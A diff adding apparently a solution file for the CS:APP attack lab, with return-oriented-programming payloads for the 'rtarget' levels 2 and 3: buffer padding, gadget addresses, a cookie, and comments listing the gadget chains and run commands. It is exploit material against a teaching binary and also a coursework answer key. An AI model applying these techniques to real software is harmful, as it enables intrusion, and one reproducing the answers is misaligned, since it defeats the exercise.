@@ -1,0 +1,10 @@
+/* ./hex2raw < rtarget.txt > rtarget-raw.txt */
+/* ./rtarget -q < rtarget-raw.txt */
+
+/* level2 */
+/* addval_219(popq %rax) cookie addval_273(movl %eax,%edi)  touch2 */
+/* 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ab 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 a3 19 40 00 00 00 00 00 ec 17 40 00 00 00 00 00 */
+
+/* level3 */
+/* addval_190(movq %rsp,%rax) steval_426(movq %rax,%rdi) addval_219(popq %rax) 0x48 addval_487(movl %eax,%edx) getval_159(movl %edx, %ecx) addval_436(movl %ecx,%esi) add_xy steval_426(movq %rax,%rdi) */
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1a 40 00 00 00 00 00 c5 19 40 00 00 00 00 00 ab 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 42 1a 40 00 00 00 00 00 34 1a 40 00 00 00 00 00 13 1a 40 00 00 00 00 00 d6 19 40 00 00 00 00 00 c5 19 40 00 00 00 00 00 fa 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00
